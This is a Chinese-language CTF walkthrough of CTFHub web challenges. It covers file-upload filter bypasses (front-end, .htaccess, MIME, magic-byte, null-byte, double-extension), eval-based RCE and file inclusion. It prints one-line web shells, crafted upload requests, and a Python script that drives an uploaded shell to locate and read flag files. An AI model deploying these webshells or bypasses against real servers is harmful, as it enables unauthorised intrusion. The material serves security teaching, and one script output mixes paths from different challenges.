通过`AntSword`连接靶机的`webshell`并打开终端，用`ldd`查看到可执行文件的执行链路，发现`/lib64/ld-linux-x86-64.so.2`是当前权限能执行的，我们可以通过它来执行`/readflag`。

```bash
(*) 基础信息
当前路径: /var/www/html
磁盘列表: /
系统信息: Linux challenge-4311b12ebeb97331-55d57c76c4-tr2mt 5.10.134-12.2.3.lifsea8.x86_64 #1 SMP Thu Apr 20 10:18:02 CST 2023 x86_64
当前用户: www-data
(*) 输入 ashelp 查看本地命令
(www-data:/var/www/html) $ ls
ant.php
index.php
(www-data:/var/www/html) $ ls / -l
total 84
drwxr-xr-x   1 root root 4096 Mar  3  2020 bin
drwxr-xr-x   2 root root 4096 Jun 26  2018 boot
drwxr-xr-x   5 root root  360 Aug  3 20:54 dev
drwxr-xr-x   1 root root 4096 Aug  3 20:54 etc
-rw-------   1 root root   33 Aug  3 20:54 flag
drwxr-xr-x   2 root root 4096 Jun 26  2018 home
drwxr-xr-x   1 root root 4096 Jul 17  2018 lib
drwxr-xr-x   2 root root 4096 Jul 16  2018 lib64
drwxr-xr-x   2 root root 4096 Jul 16  2018 media
drwxr-xr-x   2 root root 4096 Jul 16  2018 mnt
drwxr-x--x   1 root root 4096 Mar  9  2020 opt
dr-xr-xr-x 178 root root    0 Aug  3 20:54 proc
-rw-r--r--   1 root root 8648 Mar  9  2020 readflag
drwx------   1 root root 4096 Mar  9  2020 root
drwxr-xr-x   1 root root 4096 Aug  3 20:54 run
drwxr-xr-x   1 root root 4096 Mar  3  2020 sbin
drwxr-xr-x   2 root root 4096 Jul 16  2018 srv
dr-xr-xr-x  13 root root    0 Aug  4  2023 sys
drwxrwxrwt   1 root root 4096 Aug  3 20:54 tmp
drwxr-xr-x   1 root root 4096 Jul 16  2018 usr
drwxr-xr-x   1 root root 4096 Jul 17  2018 var
(www-data:/var/www/html) $ ldd /readflag
    linux-vdso.so.1 (0x00007ffdfeb3f000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f040944b000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f04099ec000)
(www-data:/var/www/html) $ ls /lib64/ld-linux-x86-64.so.2 -l
lrwxrwxrwx 1 root root 32 Jan 14  2018 /lib64/ld-linux-x86-64.so.2 -> /lib/x86_64-linux-gnu/ld-2.24.so
(www-data:/var/www/html) $ /lib64/ld-linux-x86-64.so.2 /readflag
ctfhub{de2eb2419998c06d2a75733f}
```

------

## 文件上传

### 无验证

编写`PHP`一句话木马，并上传文件。

```php
<?php @eval($_POST['t0ur1st']); ?>
```

上传成功后可以看到靶机显示：

> 上传文件相对路径
> upload/6.php

类似的一句话木马还有：

```asp
<%eval request("t0ur1st")%>
```

```aspx
<%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>
```

```html
<script language="php">@eval($_POST['shell']);</script>
```

通过`AntSword`连接靶机的`webshell`并打开终端，

```bash
$ find / -name flag*
$ cat flag_2492722517.php
<?php // ctfhub{ebfc397b4ed065684160083d}
```

提交`ctfhub{ebfc397b4ed065684160083d}`即可。

------

### 前端验证

首先在浏览器设置中禁用`JavaScript`脚本。

Chrome的设置路径是`chrome://settings/content/javascript`，不允许网站使用`JavaScript`。

编写`PHP`一句话木马，并上传文件。

```php
<?php @eval($_POST['t0ur1st']); ?>
```

上传成功后，看到页面信息：

> 上传文件相对路径
> upload/1.php

用`AntSword`连接该一句话木马文件控制靶机。在`/var/www/html/flag_1702317308.php`看到`flag`。

或者可以用`HackBar`构造`POST`请求，比如`t0ur1st=phpinfo();`可以看到靶机的`PHP`相关信息。

查看靶机根目录`t0ur1st=var_dump(scandir("/"));`，没有找到`flag`。

> array(22) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "lib64" [10]=> string(5) "media" [11]=> string(3) "mnt" [12]=> string(3) "opt" [13]=> string(4) "proc" [14]=> string(4) "root" [15]=> string(3) "run" [16]=> string(4) "sbin" [17]=> string(3) "srv" [18]=> string(3) "sys" [19]=> string(3) "tmp" [20]=> string(3) "usr" [21]=> string(3) "var" }

`PHP`中的 `glob()` 函数支持通配符，能快速模糊匹配字符串，非常适合找`flag`文件。`glob()`函数不支持递归子目录，但我们可以用`array_merge()`组合，尝试在`CTF`常见的`flag`文件路径中模糊匹配。

```php
t0ur1st=var_dump(array_merge(
    glob('/*flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

靶机信息如下，`flag`文件路径为`/var/www/html/flag_1702317308.php`。

> array(1) { [0]=> string(33) "/var/www/html/flag_1702317308.php" }

接着，我们可以使用`var_dump(file_get_contents())`显示文件内容。

```php
t0ur1st=var_dump(file_get_contents('/var/www/html/flag_1702317308.php'));
```

右键查看源码，可以看到信息如下：

> string(42) "<?php // ctfhub{9d40626b60dcac5ecef7b4dc}
> "

或者使用`print(file_get_contents())`显示文件内容。

```php
t0ur1st=print(file_get_contents('/var/www/html/flag_1702317308.php'));
```

右键查看源码，可以看到信息如下：

> <?php // ctfhub{9d40626b60dcac5ecef7b4dc}

提交`ctfhub{9d40626b60dcac5ecef7b4dc}`即可。

------

### .htaccess

> htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。

如果直接上传`.php`后缀的一句话木马，靶机会显示“文件类型不匹配”。

编写`.htaccess`文件，让服务器将所有`.jpg`文件当作`.php`文件处理。

```htaccess
AddType application/x-httpd-php .jpg
```

上传文件后，靶机显示信息如下：

> 上传文件相对路径
> upload/.htaccess

我们可以编写`PHP`一句话木马，用`Burp Suite`抓包后修改成`.jpg`后缀和文件类型`image/jpeg`后上传。

```php
<?php @eval($_POST['t0ur1st']); ?>
```

也可以直接在`.php`文件中写入以下信息，然后修改文件后缀`.jpg`，再直接上传。

```php
GIF89a
<?php @eval($_POST['t0ur1st']); ?>
```

文件上传成功后，可以直接用`AntSword`连接靶机，拿到控制权限后找出`flag`。

也可以使用`HackBar`构造`POST`请求访问`/upload/1.jpg`。查看根目录。

```php
t0ur1st=var_dump(scandir("/"));
```

> GIF89a array(22) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(10) ".dockerenv" [3]=> string(3) "bin" [4]=> string(4) "boot" [5]=> string(3) "dev" [6]=> string(3) "etc" [7]=> string(4) "home" [8]=> string(3) "lib" [9]=> string(5) "lib64" [10]=> string(5) "media" [11]=> string(3) "mnt" [12]=> string(3) "opt" [13]=> string(4) "proc" [14]=> string(4) "root" [15]=> string(3) "run" [16]=> string(4) "sbin" [17]=> string(3) "srv" [18]=> string(3) "sys" [19]=> string(3) "tmp" [20]=> string(3) "usr" [21]=> string(3) "var" }

在常见的位置查找`flag`文件。

```php
t0ur1st=var_dump(array_merge(
    glob('/*flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

靶机信息如下，`flag`文件路径为`/var/www/html/flag_858924154.php`。

> GIF89a array(1) { [0]=> string(32) "/var/www/html/flag_858924154.php" }

查看`flag`文件内容。

```php
t0ur1st=var_dump(file_get_contents('/var/www/html/flag_858924154.php'));
```

右键查看网页源码，在注释中可以找到`flag`。

> GIF89a
> string(42) "<?php // ctfhub{23218eb506abd3509c52ffb7}
> "

提交`ctfhub{23218eb506abd3509c52ffb7}`即可。

------

### MIME绕过

MIME（Multipurpose Internet Mail Extensions，多用途互联网邮件扩展类型）是一种标准，用来标识文档、文件或字节流的性质和格式，其主要作用是让客户端（如浏览器）和服务器能够识别正在传输的数据到底是什么类型，从而用正确的应用程序来进行处理。常见的MIME标识和内容类型如下：

|             MIME标识              |   内容类型   |            说明             |
| :-------------------------------: | :----------: | :-------------------------: |
|            text/plain             |    纯文本    | 普通文本（默认 ASCII 编码） |
|             text/html             |  HTML 网页   |  浏览器需按 HTML 规则渲染   |
|            image/jpeg             |   JPG 图片   |       二进制图像文件        |
|            audio/mpeg             |   MP3 音频   |          音频文件           |
|          application/zip          |  ZIP 压缩包  |       二进制压缩文件        |
| application/x-www-form-urlencoded | 表单提交数据 |      POST 表单默认编码      |

当我们在网页上选择一个文件并点击上传时，浏览器会读取该文件的扩展名和一些元数据，并根据一个内置的映射表，**自动设置好该文件的MIME类型**并将其放入HTTP请求头的`Content-Type` 字段中。上传文件时，浏览器会构造一个 `multipart/form-data` 格式的POST请求。

编写PHP一句话木马。

```php
<?php @eval($_POST['t0ur1st']); ?>
```

用`Burp Suite`抓包修改HTTP请求头的`Content-Type`字段为`image/jpeg`即可。

```
POST / HTTP/1.1
Host: challenge-36eefe4999f87a41.sandbox.ctfhub.com:10800
Content-Length: 326
Cache-Control: max-age=0
Origin: http://challenge-36eefe4999f87a41.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP4IWxr6RUtO6EiZc
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-36eefe4999f87a41.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundaryP4IWxr6RUtO6EiZc
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

<?php @eval($_POST['t0ur1st']); ?>
------WebKitFormBoundaryP4IWxr6RUtO6EiZc
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryP4IWxr6RUtO6EiZc--
```

上传成功后，靶机显示信息如下：

> 上传文件相对路径
> upload/1.php

直接用`AntSword`连接靶机，可以在`/var/www/html/flag_244514578.php`中看到`flag`。

```php
<?php // ctfhub{2ad7cbd9c7842379921777fc}
```

或者用`HackBar`构造`POST`请求。在常见的位置查找`flag`文件。

```php
t0ur1st=var_dump(array_merge(
    glob('*/flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

靶机信息如下：

> array(1) { [0]=> string(32) "/var/www/html/flag_244514578.php" }

查看`flag`文件内容。

```php
t0ur1st=var_dump(file_get_contents('/var/www/html/flag_244514578.php'));
```

右键查看网页源码，在注释中可以找到`flag`。

> string(42) "<?php // ctfhub{2ad7cbd9c7842379921777fc}
> "

提交`ctfhub{2ad7cbd9c7842379921777fc}`即可。

------

### 文件头检查

文件头检查，也称为魔术数字（Magic Number）检查或文件签名验证，其核心原理是：通过读取文件最开头的几个字节（通常是前8到20个字节），将其与已知的、标准的图片格式的固定签名进行比对，来判断该文件的真实类型。这种方法不依赖于文件的扩展名（如 `.jpg`，`.png`），因为扩展名极易被篡改，文件头检查方法检查的是文件内容的实际结构。

由前面几道文件上传题，我们可知前端验证、扩展名限制和MIME类型等加固方法都不可靠：

- 扩展名欺骗：攻击者可以将一个恶意的PHP脚本（shell.php）重命名为 shell.jpg.php 或直接修改扩展名为 .jpg。如果服务器只检查扩展名，就会误以为这是一个图片文件。
- 客户端验证可绕过：客户端的所有验证（JavaScript、HTML）都可以被攻击者通过Burp Suite等工具拦截并修改请求来轻松绕过。
- MIME类型不可靠：HTTP请求中的 Content-Type 头（如 image/jpeg）也是由客户端浏览器生成的，同样可以被恶意篡改。

因此，蓝队在加固时认为必须在**服务器端**对上传文件的真实内容进行验证，而文件头检查就是第一道防线。当然，如果只检查文件头也是不安全的，这道题就是考察如何绕过文件头检查。

**常见的图片文件头**

| 图片格式 |   文件扩展名    |                  魔术数字（十六进制文件头）                  |
| :------: | :-------------: | :----------------------------------------------------------: |
| **JPEG** | `.jpg`, `.jpeg` |       `FF D8 FF E0` 或 `FF D8 FF E1` 或 `FF D8 FF E8`        |
| **PNG**  |     `.png`      |                  `89 50 4E 47 0D 0A 1A 0A`                   |
| **GIF**  |     `.gif`      | `47 49 46 38 37 61` 或 `47 49 46 38 39 61`<br />即ASCII字符`GIF87a` , `GIF89a` |

以`GIF`后缀的文件为例，**我们需要检查目标文件的前6个字节是否完全匹配上述序列中的任一文件头。**

`.gif`后缀文件，十六进制 (Hex)：`47 49 46 38 39 61`，ASCII字符`GIF89a`，这6个字节直接构成文件头标识字符串`GIF89a`。

回到题目，打开靶机，编写`PHP`一句话木马文件。我们在这里写入`GIF89a`，就不需要抓包后再加了。

```php
GIF89a
<?php @eval($_POST['t0ur1st']); ?>
```

如果直接上传`.php`文件，靶机会显示：

> 文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件

用`Burp Suite`修改HTTP请求中的MIME类型`Content-Type: image/jpeg`。

```
POST / HTTP/1.1
Host: challenge-215f737f07351ff0.sandbox.ctfhub.com:10800
Content-Length: 334
Cache-Control: max-age=0
Origin: http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCJTHJXBoTpXy9pMG
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundaryCJTHJXBoTpXy9pMG
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/jpeg

GIF89a
<?php @eval($_POST['t0ur1st']); ?>
------WebKitFormBoundaryCJTHJXBoTpXy9pMG
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryCJTHJXBoTpXy9pMG--
```

文件上传成功后，靶机显示信息如下：

> 上传文件相对路径
> upload/1.php

用`AntSword`连接木马文件，控制靶机后可以在`/var/www/html/flag_511724942.php`中看到`flag`。

或者可以用`HackBar`构造`POST`请求。在常见的位置查找`flag`文件。

```php
t0ur1st=var_dump(array_merge(
    glob('*/flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

靶机信息如下：

> GIF89a array(1) { [0]=> string(32) "/var/www/html/flag_511724942.php" }

查看`flag`文件内容。

```php
t0ur1st=var_dump(file_get_contents('/var/www/html/flag_511724942.php'));
```

右键查看网页源码，在注释中可以找到`flag`。

> GIF89a
> string(42) "<?php // ctfhub{becfee4f61d8fedf783838d9}
> "

因为文件上传题经常需要构造`POST`请求连接木马文件控制靶机，所以我编写了一个`python`初代脚本。

```python
import requests
import re

url = 'http://challenge-215f737f07351ff0.sandbox.ctfhub.com:10800/upload/1.php'
payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
response1 = requests.post(url, data={"t0ur1st": payload_find})
print("=== Find flag files ===")
print(response1.text)

match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
if match:
    flag_path = match.group(1)
    print("Found flag file:", flag_path)
    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
    response2 = requests.post(url, data={"t0ur1st": payload_read})
    print("\n=== Read flag content ===")
    print(response2.text)
else:
    print("No flag path found.")
```

`python`代码运行结果如下：

```bash
=== Find flag files ===
GIF89a
array(1) {
  [0]=>
  string(32) "/var/www/html/flag_511724942.php"
}

Found flag file: /var/www/html/flag_511724942.php

=== Read flag content ===
GIF89a
string(42) "<?php // ctfhub{becfee4f61d8fedf783838d9}
"
```

提交`ctfhub{becfee4f61d8fedf783838d9}`即可。

------

### 00截断

> 了解一下 PHP 5.2 00截断上传的原理

00截断，也称为空字节截断，依赖于**早期PHP版本（通常指小于5.3.4）** 中的一个特性：C语言风格的字符串处理函数会将空字节（`%00` 或 `0x00`，ASCII码为0x00）视为字符串的结束符（通常写作`\0`）。当这样的函数处理文件名时，**空字节后的内容会被忽略**。

|    00截断    |                             说明                             |
| :----------: | :----------------------------------------------------------: |
| **核心原理** | 利用空字节(`%00`)在低版本PHP中作为字符串终止符的特性，截断文件名后缀，绕过白名单检查。 |
| **利用条件** |     PHP版本通常小于5.3.4；`magic_quotes_gpc`设置为Off。      |
| **关键步骤** | 在文件名或GET参数中插入`%00`（URL编码形式），使得后续后缀被忽略。 |
| **常见位置** | 文件名（如`shell.php%00.jpg`）或GET参数（如`?road=/path/to/shell.php%00`）。 |
| **防御措施** | 升级PHP版本；对用户输入进行严格过滤和验证；在服务器端检查文件内容（如MIME类型、魔术字节）。 |

查看网页源码：

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CTFHub 文件上传 - 00截断</title>
</head>

<body>
    <h1>CTFHub 文件上传 - 00截断</h1>
    <form action=?road=/var/www/html/upload/ method="post" enctype="multipart/form-data">
        <label for="file">Filename:</label>
        <input type="file" name="file" id="file" />
        <br />
        <input type="submit" name="submit" value="Submit" />
    </form>
<!--
if (!empty($_POST['submit'])) {
    $name = basename($_FILES['file']['name']);
    $info = pathinfo($name);
    $ext = $info['extension'];
    $whitelist = array("jpg", "png", "gif");
    if (in_array($ext, $whitelist)) {
        $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
        if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
            echo "<script>alert('上传成功')</script>";
        } else {
            echo "<script>alert('上传失败')</script>";
        }
    } else {
        echo "文件类型不匹配";
    }
}
-->
</body>
</html>
```

关键代码部分如下：

```php
$name = basename($_FILES['file']['name']);
$info = pathinfo($name);
$ext = $info['extension'];
$whitelist = array("jpg", "png", "gif");
if (in_array($ext, $whitelist)) {
    $des = $_GET['road'] . "/" . rand(10, 99) . date("YmdHis") . "." . $ext;
    if (move_uploaded_file($_FILES['file']['tmp_name'], $des)) {
        echo "<script>alert('上传成功')</script>";
    } else {
        echo "<script>alert('上传失败')</script>";
    }
}
```

先编写`PHP`一句话木马文件。

```
GIF89a
<?php @eval($_POST['t0ur1st']); ?>
```

我们需要用`Burp Suite`抓包修改`POST`请求。

文件路径为`/?road=/var/www/html/upload/1.php%00.jpg`，文件名`filename="1.php%00.jpg"`。

上传成功后可以在`/upload/1.php`访问木马文件。直接用`AntSword`连接木马文件控制靶机找`flag`。

也可以用`HackBar`构造`POST`请求。在常见的位置查找`flag`文件。

```php
t0ur1st=var_dump(array_merge(
    glob('/*flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

靶机信息如下，`flag`文件路径为`/var/www/html/flag_858924154.php`。

> GIF89a array(1) { [0]=> string(33) "/var/www/html/flag_2167916188.php" }

查看`flag`文件内容。

```php
t0ur1st=var_dump(file_get_contents('/var/www/html/flag_2167916188.php'));
```

右键查看网页源码，在注释中可以找到`flag`。

> GIF89a
> string(42) "<?php // ctfhub{b3175e741fecc7f08b06371a}
> "

提交`ctfhub{b3175e741fecc7f08b06371a}`即可。

------

### 双写后缀

查看网页源码：

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CTFHub 文件上传——双写绕过</title>
</head>

<body>
    <h1>CTFHub 文件上传——双写绕过</h1>
    <form action="" method="post" enctype="multipart/form-data">
        <label for="file">Filename:</label>
        <input type="file" name="file" id="file" />
        <br />
        <input type="submit" name="submit" value="Submit" />
    </form>
    <p></p>
</body>
</html>

<!--
$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");
$name = str_ireplace($blacklist, "", $name);
-->
```

编写`PHP`一句话木马。

```php
GIF89a
<?php @eval($_POST['t0ur1st']); ?>
```

用`Burp Suite`抓包修改`POST`请求中的`MIME`类型后，靶机显示信息如下：

> 上传文件相对路径
> upload/1.

很明显，文件后缀名被替换掉了，根据题目名称，尝试使用双写后缀绕过，即上传文件名为`1.pphphp`。

用`Burp Suite`抓包修改`POST`请求，双写后缀绕过。

```
POST / HTTP/1.1
Host: challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800
Content-Length: 334
Cache-Control: max-age=0
Origin: http://challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynK2B2YExV5nmQ7wA
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive

------WebKitFormBoundarynK2B2YExV5nmQ7wA
Content-Disposition: form-data; name="file"; filename="1.pphphp"
Content-Type: application/octet-stream

GIF89a
<?php @eval($_POST['t0ur1st']); ?>
------WebKitFormBoundarynK2B2YExV5nmQ7wA
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundarynK2B2YExV5nmQ7wA--
```

文件上传成功后，靶机显示信息如下：

> 上传文件相对路径
> upload/1.php

我们可以直接用`AntSword`连接靶机，拿到靶机控制权限后找出`flag`。

也可以使用`HackBar`构造`POST`请求访问`/upload/1.php`。在常见的位置查找`flag`文件。

```php
t0ur1st=var_dump(array_merge(
    glob('/*flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

靶机信息如下，`flag`文件路径为`/var/www/html/flag_2202129874.php`。

> GIF89a array(1) { [0]=> string(33) "/var/www/html/flag_2202129874.php" }

查看`flag`文件内容。

```php
t0ur1st=var_dump(file_get_contents('/var/www/html/flag_2202129874.php'));
```

右键查看网页源码，在注释中可以找到`flag`。

>GIF89a
>string(42) "<?php // ctfhub{8e74299472595775b12434ed}
>"

或者直接用`python`代码构造`POST`请求连接一句话木马读取`flag`文件。

```python
import requests
import re

url = 'http://challenge-e0a1a32b385c0740.sandbox.ctfhub.com:10800/upload/1.php'
payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
response1 = requests.post(url, data={"t0ur1st": payload_find})
print("=== Find flag files ===")
print(response1.text)

match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
if match:
    flag_path = match.group(1)
    print("Found flag file:", flag_path)
    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
    response2 = requests.post(url, data={"t0ur1st": payload_read})
    print("\n=== Read flag content ===")
    print(response2.text)
else:
    print("No flag path found.")
```

`python`代码运行结果如下：

```python
=== Find flag files ===
GIF89a
array(1) {
  [0]=>
  string(33) "/var/www/html/flag_2202129874.php"
}

Found flag file: /var/www/html/flag_2202129874.php

=== Read flag content ===
GIF89a
string(42) "<?php // ctfhub{8e74299472595775b12434ed}
"
```

提交`ctfhub{8e74299472595775b12434ed}`即可。

------

## RCE

### eval执行

进入靶机后，直接就是`PHP`代码审计。

```php
<?php
if (isset($_REQUEST['cmd'])) {
    eval($_REQUEST["cmd"]);
} else {
    highlight_file(__FILE__);
}
?>
```

当用户提供`cmd`参数时，它无条件地执行传递参数中的`PHP`代码。当用户没有提供`cmd`参数时，它将自己的源代码显示出来，即我们看到的上述代码。攻击者可以通过访问这个脚本的URL，并附加 `cmd` 参数来控制靶机服务器，其风险点具体如下所示。

- **任意代码执行 (RCE)：** `eval($_REQUEST["cmd"])` 是高危风险点，它允许攻击者执行任何`PHP`代码，而`PHP`几乎可以调用所有系统命令和操作所有文件。

- **多种传参方式：** 使用 `$_REQUEST` 使得攻击者可以通过 **GET**（URL）、**POST**（表单）或 **COOKIE** 来传递恶意命令，更加隐蔽。
- **白给自身源码**：当用户不传递参数时，它显示自己的代码，就像展示攻击点说明书一样。

#### 解法一：`GET`传参

我们可以直接`GET`传参`?cmd=system(%27ls%20/%27);`，靶机显示内容如下：

> bin boot dev etc flag_17723 home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var

由此可知，靶机的`flag`文件为`flag_17723`。正好借此机会复习一下`Linux`常用的读取文件命令行。

用`cat`读取文件，即执行`cat /flag`，具体传参为`/?cmd=system(%27cat%20/flag_17723%27);`。

用`tail`读取文件，`tail`用于显示文件末尾内容，可以通过`-n`指定显示行数，默认输出末尾10行。即执行`tail /flag`，具体传参为`/?cmd=system(%27tail%20/flag_17723%27);`。

用`head`读取文件，`head`用于查看文件开头内容，可以通过`-n`指定显示行数，默认显示10行内容。即执行`head /flag`，具体传参为`/?cmd=system(%27head%20/flag_17723%27);`。

用`grep`读取文件，`grep`主要用于搜索文件里符合条件的字符串或正则表达式。`grep`指令也可用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设`grep`指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，则`grep`指令会从标准输入设备读取数据。即执行`grep /flag`，具体传参为`/?cmd=system(%27grep%20/flag_17723%27);`。

用`strings`读取文件，`strings`能显示文件中可打印字符串，一般用于从二进制文件提取可打印字符。即执行`strings /flag`，具体传参为`/?cmd=system(%27strings%20/flag_17723%27);`。

用`awk`读取文件，`awk`是一个文本处理工具，能够逐行读取文本文件，也可用于选择性查看。比如查看前三行内容`awk 'NR<=3' /flag`，具体传参为`/?cmd=system("awk 'NR<=3' /flag_17723");`。

用`sed`读取文件，`sed`是流编辑器，也可以查看特定行。比如查看前三行内容`sed -n '1,3p' /flag`，具体传参为`/?cmd=system("sed -n '1,3p' /flag_17723");`。

以上所有命令执行后，靶机的显示信息如下：

> ctfhub{d0fcbbf8ba8db617979a634d}

用`more`读取文件，`more`类似于`cat`，但是会分页显示内容，便于逐页阅读文件。即执行`more /flag`，具体传参为`/?cmd=system(%27more%20/flag_17723%27);`。执行后靶机显示的信息如下：

> :::::::::::::: /flag_17723 :::::::::::::: ctfhub{d0fcbbf8ba8db617979a634d}

用`nl`读取文件，`nl`的主要功能是读取文件内容并为每一行添加行号，再将结果输出到标准输出。即执行`nl /flag`，具体传参为`/?cmd=system(%27nl%20/flag_17723%27);`。执行后靶机显示的信息如下：

> 1 ctfhub{d0fcbbf8ba8db617979a634d}

------

#### 解法二：`HackBar`构造`POST`请求

我们用`HackBar`构造`POST`请求。在`flag`的常见位置查找`flag`文件。

```php
cmd=var_dump(array_merge(
    glob('/*flag*'),
    glob('/home/*/*flag*'),
    glob('/var/www/*/*flag*'),
    glob('/tmp/*flag*')
));
```

接着用`print`配合`file_get_contents`将`flag`文件中的内容读取出来。

```php
cmd=print(file_get_contents('/flag_17723'));
```

执行后靶机显示的信息如下：

> ctfhub{d0fcbbf8ba8db617979a634d}

或者用`var_dump`配合`file_get_contents`将`flag`文件中的内容显示出来。

```php
cmd=var_dump(file_get_contents('/flag_17723'));
```

执行后靶机显示的信息如下：

> string(33) "ctfhub{d0fcbbf8ba8db617979a634d} "

------

#### 解法三：`AntSword`连接靶机

打开`AntSword`连接靶机，直接可以在`/flag_17723`中看到`flag`内容。

------

#### 解法四：编写`python`代码

这道题跟`HackBar`构造`POST`请求和`AntSword`连接靶机类似，如果能用自己的笔记本打CTF比赛时用起来最快最方便；如果是用机房中的公用电脑打CTF还是用`AntSword`最合适最省时间。

```python
import requests
import re

url = 'http://challenge-14d17025269b6105.sandbox.ctfhub.com:10800/'
payload_find = "var_dump(array_merge(glob('*/flag*'), glob('/home/*/*flag*'), glob('/var/www/*/*flag*'), glob('/tmp/*flag*')));"
response1 = requests.post(url, data={"cmd": payload_find})
print("=== Find flag files ===")
print(response1.text)

match = re.search(r'string\(\d+\)\s+"([^"]+)"', response1.text)
if match:
    flag_path = match.group(1)
    print("Found flag file:", flag_path)
    payload_read = f"var_dump(file_get_contents('{flag_path}'));"
    response2 = requests.post(url, data={"t0ur1st": payload_read})
    print("\n=== Read flag content ===")
    print(response2.text)
else:
    print("No flag path found.")
```

代码执行结果如下：

```
=== Find flag files ===
array(1) {
  [0]=>
  string(11) "/flag_17723"
}

Found flag file: /var/www/html/flag_2202129874.php

=== Read flag content ===
string(33) "ctfhub{d0fcbbf8ba8db617979a634d} "
```

------

### 文件包含

在PHP中常见的文件包含函数有：`include()`，`require()`，`include_once()`，`require_once()`。

进入靶机后，直接就是`PHP`代码审计，发现`file`参数能用`include`包含文件但是过滤掉了`flag`关键字。

#### 解法一：文件包含`shell.txt`。

```php+HTML
<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i have a <a href="shell.txt">shell</a>, how to use it ?
i have a shell, how to use it ?
```

点击链接查看`shell.txt`，其内容如下：

```php
<?php eval($_REQUEST['ctfhub']);?>
```

我们可以通过`file`参数传递`shell.txt`，使得靶机调用`include`文件包含`shell.txt`。

